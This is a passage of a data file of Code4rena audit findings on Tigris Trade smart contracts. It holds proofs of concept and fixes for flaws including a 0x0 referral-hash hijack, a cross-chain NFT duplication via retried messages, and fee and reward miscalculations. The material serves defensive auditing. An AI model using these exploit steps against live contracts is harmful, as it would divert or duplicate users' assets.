      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L177-L183> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/BondNFT.sol#L235-L242>\n\n### Impact\n\nIn `BondNFT.sol#claim()`, `accRewardsPerShare[][]` is amended to reflect the expired shares. But only `accRewardsPerShare[bond.asset][epoch[bond.asset]]` is updated. All the epochs between `bond.expireEpoch-1` and `epoch[bond.asset]` are missed.\n\nHowever, some users claimable rewards calculation could be based on the missed epochs. As a result, the impact might be:\n\n*   `accRewardsPerShare` is inaccurate for the epochs in between.\n*   Some users could lose reward due to wrong `accRewardsPerShare`, some users might receive undeserved rewards.\n*   Some rewards will be locked in the contract.\n\n### Proof of Concept\n\nThe rationale behind the unchecked block below seems to take into account the shares of reward of the expired bond. However, if you only update the latest epoch data, the epochs in between could have errors and lead to loss of other users.\n\n```solidity\nFile: contracts/BondNFT.sol\n168:     function claim(\n169:         uint _id,\n170:         address _claimer\n171:     ) public onlyManager() returns(uint amount, address tigAsset) {\n    \n177:             if (bond.expired) {\n178:                 uint _pendingDelta = (bond.shares * accRewardsPerShare[bond.asset][epoch[bond.asset]] / 1e18 - bondPaid[_id][bond.asset]) - (bond.shares * accRewardsPerShare[bond.asset][bond.expireEpoch-1] / 1e18 - bondPaid[_id][bond.asset]);\n179:                 if (totalShares[bond.asset] > 0) {\n180:                     accRewardsPerShare[bond.asset][epoch[bond.asset]] += _pendingDelta*1e18/totalShares[bond.asset];\n181:                 }\n182:             }\n183:             bondPaid[_id][bond.asset] += amount;\n```\n\nUsers can claim rewards up to the expiry time, based on `accRewardsPerShare[tigAsset][bond.expireEpoch-1]`:\n\n```solidity\n235:     function idToBond(uint256 _id) public view returns (Bond memory bond) {\n    \n238:         bond.expired = bond.expireEpoch <= epoch[bond.asset] ? true : false;\n239:         unchecked {\n240:             uint _accRewardsPerShare = accRewardsPerShare[bond.asset][bond.expired ? bond.expireEpoch-1 : epoch[bond.asset]];\n241:             bond.pending = bond.shares * _accRewardsPerShare / 1e18 - bondPaid[_id][bond.asset];\n\n```\n\n**[TriHaz (Tigris Trade) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1377671576):**\n > Acknowledged, we cant redistribute past rewards accurately because it would cost too much gas.\n >\n> I would downgrade it to Medium risk, needs an opinion from judge.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1399436419):**\n > The Warden has shown how, due to how epochs are handled, some rewards could be lost unless claimed each epoch.\n> \n> Because the finding pertains to a loss of Yield, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/392#issuecomment-1407761754):**\n > It is not feasible to update accRewardsPerShare for every epoch during which bond was expired. This issue is mitigated by the fact that anyone can release an expired bond, so the small difference in yield shouldn't affect users that much.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the `claim` function in the `BondNFT` contract. The function updates `accRewardsPerShare` to reflect expired shares, but only updates the latest epoch, leaving all epochs in between the expiration and current epoch unchanged. This can result in inaccurate `accRewardsPerShare` values for those epochs, potentially causing some users to lose or receive incorrect rewards and locking some rewards in the contract. A proposed solution was deemed too costly, and the severity of the bug was downgraded to medium. The team believes this issue is mitigated by the fact that expired bonds can be released by anyone.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/392",
      "tags": [],
      "finders": [
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "43157",
      "title": "[M-13] One can become referral of hash 0x0 and because all users default referral hash is 0x0 so he would become all users referral by default and earn a lot of fees while users didn't approve it",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Referrals.sol#L20-L24> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/TradingExtension.sol#L148-L152>\n\n### Impact\n\nBy default the value of `_referred[user]` is 0x0 for all users and if one set 0x0 as his referral hash then he would become referral for all the users who didn't set referral by default and he would earn a lot of referral funds that users didn't approve it.\n\n### Proof of Concept\n\nThis is `createReferralCode()` code:\n\n        function createReferralCode(bytes32 _hash) external {\n            require(_referral[_hash] == address(0), \"Referral code already exists\");\n            _referral[_hash] = _msgSender();\n            emit ReferralCreated(_msgSender(), _hash);\n        }\n\nAs you can see, attacker can become set 0x0 as his hash referral by calling `createReferralCode(0x0)` and code would set `_referral[0x0] = attackerAddress` (attacker needs to be the first one calling this).\n\nThen in the `getRef()` code the logic would return `attackerAddress` as referral for all the users who didn't set referral.\n\n        function getRef(\n            address _trader\n        ) external view returns(address) {\n            return referrals.getReferral(referrals.getReferred(_trader));\n        }\n\nIn the code, getReferred(trader) would return 0x0 because trader didn't set referred and getReferral(0x0) would return attackerAddress.\n\n`_handleOpenFees()` and `_handleCloseFees()` function in the Trading contract would use `getRef(trader)` and they would transfer referral fee to attackerAddress and attacker would receive fee from a lot of users which didn't set any referral, those users didn't set any referral and didn't approve attacker receiving referral fees from them and because most of the users wouldn't know about this and referral codes so attacker would receive a lot of funds.\n\n### Tools Used\n\nVIM\n\n### Recommended Mitigation Steps\n\nPrevent someone from setting 0x0 hash for their referral code.\n\n**[TriHaz (Tigris Trade) confirmed and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1363604388):**\n> It is valid but I'm not 100% sure it should be a High risk. Would like an opinion from a judge.\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1385583666):**\n > The Warden has shown how, due to an incorrect assumption, the first claimer to the 0 hash will receive referral fees for all non-referred users.\n> \n> Because the finding creates a negative externality and shows a way to extract value from what would be assumed to be the null value, I believe the finding to be of Medium Severity.\n> \n> I'd recommend the Sponsor either mitigate or set themselves as the 0 hash recipient as a way to receive default fees.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/379#issuecomment-1407760281):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175772 \n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability found in the Tigris Trade contract, specifically in the Referrals and TradingExtension contracts. The vulnerability allows an attacker to set their referral code to 0x0, which is the default value for all users. This means that the attacker would become the referral for all users who did not set a referral code, and would earn referral funds without the users' approval. The code for creating a referral code and getting a referral does not account for this possibility, leading to the vulnerability. The recommended mitigation step is to prevent users from setting their referral code to 0x0. The severity of this bug was initially considered high, but was later decreased to medium by a judge. The sponsor has resolved the issue by implementing the recommended mitigation step.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/379",
      "tags": [],
      "finders": [
        "unforgiven"
      ]
    },
    {
      "id": "43156",
      "title": "[M-11] `_handleOpenFees` returns an incorrect value for `_feePaid`. This directly impacts margin calculations",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L734>\n\n### Impact\n\nFormula for `fee paid` in [Line 734](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L734) is incorrect leading to incorrect margin calculations. Since this directly impacts the trader margin and associated fee calculations, I've marked as HIGH risk.\n\nOn initiating a market order, `Margin` is adjusted for the `fees` that is charged by protocol. This adjustment is in [Line 178 of Trading](https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/Trading.sol#L178). Fees computed by ` _handleOpenFees  ` is deducted from Initial margin posted by user.\n\nFormula misses to account for the `2*referralFee` component while calculaing `_feePaid`.\n\n### Proof of Concept\n\nNote that `_feePaid` as per formula in Line 734 is the sum of ` _daoFeesPaid`, and sum of  `burnerFee`&`botFee` .  `\\_daoFeesPaid`is calculated from`\\_fees.daoFees`which itself is calculated by subtracting`2\\*referralFee`and`botFee\\`.\n\nSo when we add back `burnerFee` and `botFee` to `_feePaid`, we are missing to add back the `2*referralFee`  which was earlier excluded when calculating `_daoFeesPaid`. While `botFee` is added back correctly, same adjustment is not being done viz-a-viz referral fee.\n\nThis results in under calculating the `_feePaid` and impacts the rewards paid to the protocol NFT holders.\n\n### Recommended Mitigation Steps\n\nSuggest replacing the formula in line 734 with below (adding back `\\_fees.referralFees\\*2`)\n\n                _feePaid =\n                    _positionSize\n                    * (_fees.burnFees + _fees.botFees + _fees.referralFees*2 ) \n                    / DIVISION_CONSTANT // divide by 100%\n                    + _daoFeesPaid;\n\n**[Alex the Entreprenerd (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/367#issuecomment-1408804631):**\n > The warden has shown a mistake in how fees are calculated, the impact will cause a loss of yield to the protocol, however no convincing argument was made as to how this can cause a loss to depositors or users (loss of principal), for this reason, I believe Medium Severity to be the most appropriate.\n\n**[GainsGoblin (Tigris Trade) confirmed and  commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/367#issuecomment-1426771208):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419176602 \n\n***\n\n",
      "summary": "\nThe bug report is about a mistake in the formula for calculating fees in a trading contract. This mistake can lead to incorrect margin and fee calculations, which can affect the rewards paid to the protocol's NFT holders. The suggested solution is to replace the formula in line 734 with a corrected one. The severity of the bug has been decreased to medium as it does not directly cause a loss of principal for depositors or users. The recommended mitigation step can be found in a pull request on the project's GitHub page.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/367",
      "tags": [],
      "finders": [
        "chaduke",
        "0Kage"
      ]
    },
    {
      "id": "43155",
      "title": "[M-10] `BondNFT.extendLock` force a user to extend the bond at least for current bond.period",
      "impact": "MEDIUM",
      "content": "\nThe current implementation forces a user to extend their bonds for at least they current bond period. This means that, for instance, a bond which was initially locked for 365 can never be extended, even after a week of being created.\n\nIf we consider that a bond should have at least a 7 days lock and at the most 365 days, then the current `BondNFT.extendLock` function should be refactored.\n\n### Impact\n\n*   Current `BondNFT.extendLock` function does not work as expected, forcing user who wants to extend their bond to extend them at least for their current bond.period.\n*   For bonds which were set with a lock period of 365 days, they can not be extended, even after days of their creation.\n\n### Proof of Concept\n\n```typescript\n// In 09.Bond.js,  describe \"Extending lock\"\nit(\"POC: Extending the lock does not work as expected\", async function () {\n      await stabletoken.connect(owner).mintFor(user.address, ethers.utils.parseEther(\"100\"));\n      // user lock bond funds for 10 days\n      await lock.connect(user).lock(StableToken.address, ethers.utils.parseEther(\"100\"), 10);\n\n      const fiveDaysTime = 5 * 24 * 60 * 60\n      const eightDaysTime = 8 * 24 * 60 * 60\n\n      // owner distribute rewards\n      console.log(\"User created a lock for 10 days\")\n      await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(\"10\"));\n      await bond.connect(owner).distribute(stabletoken.address, ethers.utils.parseEther(\"10\"));\n\n      // Five days pass\n      await network.provider.send(\"evm_increaseTime\", [fiveDaysTime]); // Skip 10 days\n      await network.provider.send(\"evm_mine\");\n      console.log(\"\\n5 days pass\")\n\n      // User decide to extend their lock three days, given the current implementation the user is forced to extended 13 days\n      const bondInfoBeforeExtension = await bond.idToBond(1)\n      console.log(`Bond info before extension: {period: ${bondInfoBeforeExtension.period}, expireEpoch: ${bondInfoBeforeExtension.expireEpoch}}`)\n      \n      await lock.connect(user).extendLock(1, 0, 3)\n      console.log(\"Bond was extended for 3 days\")\n      const bondInfoAfterExtension = await bond.idToBond(1)\n      console.log(`Bond info after extension: {period: ${bondInfoAfterExtension.period}, expireEpoch: ${bondInfoAfterExtension.expireEpoch}}`)\n\n      // 8 days pass, user should be able to release the bond given the extension of 3 days (8 days should be enough)\n      await network.provider.send(\"evm_increaseTime\", [eightDaysTime]);\n      await network.provider.send(\"evm_mine\");\n      console.log(\"\\n8 days later\")\n      console.log(\"After 13 days (10 original days + 3 days from extension) the user can not release the bond\")\n      \n      // The user decide to claim their part and get their bond amount\n      // The user should recieve all the current funds in the contract\n      await expect(lock.connect(user).release(1)).to.be.revertedWith('!expire')\n\n    });\n```\n\n### Recommended Mitigation Steps\n\nIn order to `extendLock` to work properly, the current implementation  should be changed to:\n\n```diff\nfunction extendLock(\n    uint _id,\n    address _asset,\n    uint _amount,\n    uint _period,\n    address _sender\n) external onlyManager() {\n    Bond memory bond = idToBond(_id);\n    Bond storage _bond = _idToBond[_id];\n    require(bond.owner == _sender, \"!owner\");\n    require(!bond.expired, \"Expired\");\n    require(bond.asset == _asset, \"!BondAsset\");\n    require(bond.pending == 0); //Cannot extend a lock with pending rewards\n+   uint currentEpoch = block.timestamp/DAY;\n-   require(epoch[bond.asset] == block.timestamp/DAY, \"Bad epoch\");\n    require(epoch[bond.asset] == currentEpoch, \"Bad epoch\");\n\n+   uint pendingEpochs = bond.expireEpoch - currentEpoch;\n+   uint newBondPeriod = pendingEpochs + _period;\n+   //In order to respect min bond period when we extend a bon\n+   // Next line can be omitted at discretion of the protocol and devs\n+   // If it is omitted any created bond would be able to be extended always (except from those with period = 365)\n+   require(newBondPeriod >= 7, \"MIN PERIOD\");\n\n-    require(bond.period+_period <= 365, \"MAX PERIOD\");\n+    require(newBondPeriod <= 365, \"MAX PERIOD\");\n    \n    unchecked {\n-       uint shares = (bond.amount + _amount) * (bond.period + _period) / 365;\n+       uint shares = (bond.amount + _amount) * newBondPeriod / 365;\n\n-       uint expireEpoch = block.timestamp/DAY + bond.period + _period;\n+       uint expireEpoch = currentEpoch + newBondPeriod;\n\n        totalShares[bond.asset] += shares-bond.shares;\n        _bond.shares = shares;\n        _bond.amount += _amount;\n        _bond.expireEpoch = expireEpoch;\n        _bond.period += _period;\n        _bond.mintTime = block.timestamp; \n-       _bond.mintEpoch = epoch[bond.asset];\n+       _bond.mintEpoch = currentEpoch;\n-       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][epoch[bond.asset]] * _bond.shares / 1e18;\n+       bondPaid[_id][bond.asset] = accRewardsPerShare[bond.asset][currentEpoch] * _bond.shares / 1e18;\n    }\n    emit ExtendLock(_period, _amount, _sender,  _id);\n}\n```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/359#issuecomment-1385304841):**\n> The warden has shown that the mechanic for extending locks can cause lock duration to be longer than intended, while rewards math will behave as inputted by the user.\n> \n> While an argument for this being a user mistake could be made, I believe that in this case the demonstrated logic flaw takes precedence, that's because a user interacting with the system as intended will still be locked for longer than intended and receive less rewards for that mistake.\n> \n> For this reason (conditionality, logic flaw, no loss of principal) I believe Medium Severity to be appropriate.\n\n**[GainsGoblin (Tigris Trade) confirmed and  commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/359#issuecomment-1407758971):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175579 \n\n\n***\n\n",
      "summary": "\nThe current implementation of the `BondNFT.extendLock` function does not work as expected. It forces users to extend their bonds for at least the current bond period, which means that a bond that was initially locked for 365 days can never be extended, even after a week of being created. This bug affects the ability of users to extend their lock periods and receive rewards as intended. A proof of concept has been provided to demonstrate this issue. To mitigate this bug, the `extendLock` function should be refactored to allow for a minimum lock period of 7 days and a maximum of 365 days. This will ensure that users can extend their lock periods as intended without any unexpected consequences.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/359",
      "tags": [],
      "finders": [
        "carlitox477"
      ]
    },
    {
      "id": "43154",
      "title": "[M-09] `safeTransferMany()` doesn't actually use safe transfer",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L247> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L285>\n\nBoth `BondNFT` and `GovNFT` are an ERC721 implementation, and they both also have a function named `safeTransferMany()` which its name implies is supposed to safe transfer many tokens at once.\nHowever the function doesn't actually safe transfer.\n\n### Impact\n\nUsers might use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but will get their funds stuck in a contract that doesn't support ERC721.\n\n### Proof of Concept\n\nI've added the following tests to the `GovNFT` tests.\n\n1st test will succeed (tx will revert) since `safeTransferFrom()` does actually use safe transfer.\n\n2nd will fail (tx won't revert), since `safeTransferMany()` doesn't actually use a safe transfer.\n\n```diff\ndiff --git a/test/05.GovNFT.js b/test/05.GovNFT.js\nindex 711a649..d927320 100644\n--- a/test/05.GovNFT.js\n+++ b/test/05.GovNFT.js\n@@ -98,6 +98,14 @@ describe(\"govnft\", function () {\n       expect(await govnft.pending(owner.getAddress(), StableToken.address)).to.equal(1500);\n       expect(await govnft.pending(user.getAddress(), StableToken.address)).to.equal(500);\n     });\n+\n+    it(\"Safe transfer to non ERC721Receiver\", async function () {\n+      \n+      expect(govnft.connect(owner)['safeTransferFrom(address,address,uint256)'](owner.address,StableToken.address, 2)).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\");\n+    });\n+    it(\"Safe transfer many  to non ERC721Receiver\", async function () {\n+      await expect(govnft.connect(owner).safeTransferMany(StableToken.address, [2])).to.be.revertedWith(\"ERC721: transfer to non ERC721Receiver implementer\");\n+    });\n     it(\"Transferring an NFT with pending delisted rewards should not affect pending rewards\", async function () {\n       await govnft.connect(owner).safeTransferMany(user.getAddress(), [2,3]);\n       expect(await govnft.balanceOf(owner.getAddress())).to.equal(0);\n\n```\n\nOutput (I've shortened the output. following test will also fail, since the successful transfer will affect them):\n\n          ✔ Safe transfer to contract\n          1) Safe transfer many to contract\n\n\n      11 passing (3s)\n      1 failing\n\n      1) govnft\n           Reward system related functions\n             Safe transfer many to contract:\n\n          AssertionError: Expected transaction to be reverted\n          + expected - actual\n\n          -Transaction NOT reverted.\n          +Transaction reverted.\n\n### Recommended Mitigation Steps\n\nCall `_safeTransfer()` instead of `_transfer()`.\n\n**[TriHaz (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/356)**  \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/356#issuecomment-1382257925):**\n > The Warden has shown a discrepancy between the intent of the code and the actual functionality when it comes to the `safeTransfer...` function.\n> \n> Because this finding is reliant on understanding the intention of the Sponsor, and in this case they have confirmed, I believe that the finding is valid and of Medium Severity, because the function was intended to be using the safe checks, but wasn't.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/356#issuecomment-1407533514):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419175381 \n >\n> We decided that we do not want transfers to check that the receiver is implementing IERC721Receiver, so we renamed the functions.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about two contracts, `BondNFT` and `GovNFT`, which are both ERC721 implementations. They both have a function called `safeTransferMany()` that is supposed to safely transfer multiple tokens at once. However, the function does not actually perform a safe transfer as its name implies. This means that users may use this function, expecting it to verify that the receiver is an `ERC721Receiver`, but their funds will get stuck in a contract that does not support ERC721. The report includes a proof of concept with two tests, one that will succeed and one that will fail due to the incorrect functionality of the `safeTransferMany()` function. The recommended mitigation step is to call `_safeTransfer()` instead of `_transfer()`. The bug has been confirmed by the team and resolved by renaming the functions. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/356",
      "tags": [],
      "finders": [
        "HollaDieWaldfee",
        "8olidity",
        "0xmuxyz",
        "0xA5DF",
        "0x4non"
      ]
    },
    {
      "id": "43153",
      "title": "[M-05] Failure in `endpoint` can cause minting more than one NFT with the same token id in different chains",
      "impact": "MEDIUM",
      "content": "\nIn the contract `GovNFT`, it is possible to bridge the governance NFT to other chains. It is also stated in the document that:\n\n> NFT holders only earn the profits generated by the platform on the chain that the NFT is on.\n\nIt is assumed that there is only one unique NFT per token id. But there is a scenario that can lead to more than one NFT with the same token id on different chains.\n\n### Proof of Concept\n\n*   Suppose Bob (honest user who owns an NFT with token id X on chain B) plans to bridge this NFT from chain B to chain A. So, Bob calls the function `crossChain` to bridge the NFT from chain B to chain A. Thus, his NFT will be burnt on chain B, and it is supposed to be minted on chain A.\n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L124>\n\n*   The `endpoint` is responsible for completing  the bridging task on chain A.\n*   Suppose the `endpoint` calls the function `lzReceive` with low gas on chain A, so that the transaction will be not successful.\n\n<!---->\n\n    function lzReceive(\n            uint16 _srcChainId,\n            bytes memory _srcAddress,\n            uint64 _nonce,\n            bytes memory _payload\n        ) external override {\n            require(_msgSender() == address(endpoint), \"!Endpoint\");\n            (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n            // try-catch all errors/exceptions\n            if (!success) {\n                failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);\n                emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);\n            }\n        }\n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L168>\n\n*   Since the transaction was not successful, the message will be added as a failed message.\n\n<!---->\n\n    failedMessages[chainB][Bob's address][_nonce] = keccak256(_payload);\n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L178>\n\n*   Then, due to network lag (or any server issue, or any failure in `endpoint`), the `endpoint` assumes that the transaction is not sent, and it again calls this function with enough gas, so, the NFT with token id X will be minted to Bob's address on chain A. The flow is as follows:\n\n`lzReceive` ==> `nonblockingLzReceive` ==> `_nonblockingLzReceive` ==> `_bridgeMint`\n\n*   Now Bob has the NFT on chain A. Moreover, he has a failed message on chain A.\n*   Then Bob calls the function `crossChain` to bridge that NFT from chain A to chain B. So, this NFT will be burnt on chain A, and minted to Bob's address on chain B.\n*   Now, Bob has the NFT with token id X on chain B. Moreover, he has a failed message on chain A.\n*   He calls the function `retryMessage` to retry the failed message on chain A.\n\n<https://github.com/code-423n4/2022-12-tigris/blob/588c84b7bb354d20cbca6034544c4faa46e6a80e/contracts/GovNFT.sol#L206>\n\n*   By doing so the NFT with token id X will be minted to Bob on chain A. The flow is as follows:\n\n`retryMessage` ==> `_nonblockingLzReceive` ==> `_bridgeMint`\n\n*   Now Bob has the NFT with token id X on both chain A and chain B. This is the vulnerability.\n*   Now he can, for example, sell the NFT on chain B while he is earning the profits generated by the platform on the chain A that the NFT is on.\n*   Please note that Bob can not call the function `retryMessage` while he owns the NFT on chain A. Because during minting the NFT, it checks whether the token id exists or not. That is why Bob first bridges the NFT to another chain, and then retries the failed message.\n\n***The vulnerability is that when the message is failed, it is not considered as consumed, so in case of a failure in `endpoint` it is possible to have failed messages and be able to mint it at the same time.***\n\nPlease note that if this scenario happens again, more NFTs with the same token id X will be minted to Bob on different chains.\n\n### Recommended Mitigation Steps\n\nIt is recommended to track the consumed messages, and add a consumed flag whenever the function `lzReceive` is called, because it will either immediately mint the NFT or add it to the failed messages to be minted later.\n\n    mapping(uint16 => mapping(bytes => mapping(uint64 => bool))) public consumedMessage;\n\n        function lzReceive(\n            uint16 _srcChainId,\n            bytes memory _srcAddress,\n            uint64 _nonce,\n            bytes memory _payload\n        ) external override {\n            \n            require(!consumedMessage[_srcChainId][_srcAddress][_nonce], \"already consumed\");\n            consumedMessage[_srcChainId][_srcAddress][_nonce] = true;\n\n            require(_msgSender() == address(endpoint), \"!Endpoint\");\n            (bool success, bytes memory reason) = address(this).excessivelySafeCall(gasleft()*4/5, 150, abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload));\n            // try-catch all errors/exceptions\n            if (!success) {\n                failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);\n                emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, reason);\n            }\n        }\n\n**[GainsGoblin (Tigris Trade) confirmed](https://github.com/code-423n4/2022-12-tigris-findings/issues/150)** \n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/150#issuecomment-1387181367):**\n> The Warden has shown a flaw in the FSM in `lzReceive` that, due to an unexpected revert, could cause the ability to have the same tokenId on multiple chains.\n> \n> Because of it's reliance on external conditions, I agree with Medium Severity.\n\n**[GainsGoblin (Tigris Trade) resolved](https://github.com/code-423n4/2022-12-tigris-findings/issues/150#issuecomment-1407486546):**\n > Mitigation: https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174114 \n >\n> This implementation of consumedMessage check returns instead of reverts. We don't want it to revert because that would cause the message queue to be blocked.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the contract \"GovNFT\" which allows users to bridge governance NFTs to other chains. The report outlines a scenario where a user can end up with multiple NFTs with the same token ID on different chains, which is not intended. This can lead to the user earning profits from the platform on multiple chains, which is not the intended behavior. The report suggests a mitigation step of tracking consumed messages and adding a consumed flag to prevent this scenario from happening. The severity of the bug is classified as medium and has been confirmed and resolved by the developers. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/150",
      "tags": [],
      "finders": [
        "HE1M"
      ]
    },
    {
      "id": "43152",
      "title": "[M-04] Approved operators of Position token can't call Trading.initiateCloseOrder",
      "impact": "MEDIUM",
      "content": "\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235> \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849>\n\n### Impact\n\nApproved operators of owner of Position token can't call several function in Trading.\n\n### Proof of Concept\n\nFunctions that accept Position token in Trading are checking that the caller is owner of token using `\\_checkOwner` function. \n\n<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L847-L849>\n\n```soldiity\n    function _checkOwner(uint _id, address _trader) internal view {\n        if (position.ownerOf(_id) != _trader) revert(\"2\"); //NotPositionOwner   \n    }\n```\n\nAs you can see this function doesn't allow approved operators of token's owner to pass the check. As a resul, functions are not possible to call for them on behalf of owner.\n\nFor example [here](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/Trading.sol#L235), there is a check that doesn't allow to call initiateCloseOrder function.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nAllow operators of token's owner to call functions on behalf of owner.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/124#issuecomment-1385166664):**\n > The warden has shown how, due to an inconsistency between the check and the permissions, some functions will not work for an approved operator.\n> \n> Because some functions will, and the system seems to be written with the intention of allowing that functionality, I believe Medium Severity to be the most appropriate.\n\n**[GainsGoblin (Tigris Trade) acknowledged and commented](https://github.com/code-423n4/2022-12-tigris-findings/issues/124#issuecomment-1400571072):**\n > @Alex the Entreprenerd We want to keep `_checkOwner()` the way it is currently implemented. For approving another address for trading on behalf of the user's address, we have the `approveProxy()` function.\n\n\n\n***\n\n",
      "summary": "\nThe bug report is about a problem with the Trading contract in the Tigris project. The issue is that approved operators of the owner of a Position token are not able to call certain functions in the Trading contract. This is because the contract checks if the caller is the owner of the token using a function called `_checkOwner`, which does not allow approved operators to pass the check. This means that functions cannot be called on behalf of the owner by an approved operator. The bug report recommends allowing operators of the token's owner to call functions on behalf of the owner to fix this issue. The report also includes comments from a judge and the Tigris Trade team acknowledging and discussing the issue. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tigris Trade",
      "source_link": "https://code4rena.com/reports/2022-12-tigris",
      "github_link": "https://github.com/code-423n4/2022-12-tigris-findings/issues/124",
      "tags": [],
      "finders": [
        "rvierdiiev",
        "UniversalCrypto",
        "\\_\\_141345\\_\\_"
      ]
    },
    {
      "id": "43151",
      "title": "[H-09] Users can bypass the `maxWinPercent` limit using a partially closing",
      "impact": "HIGH",
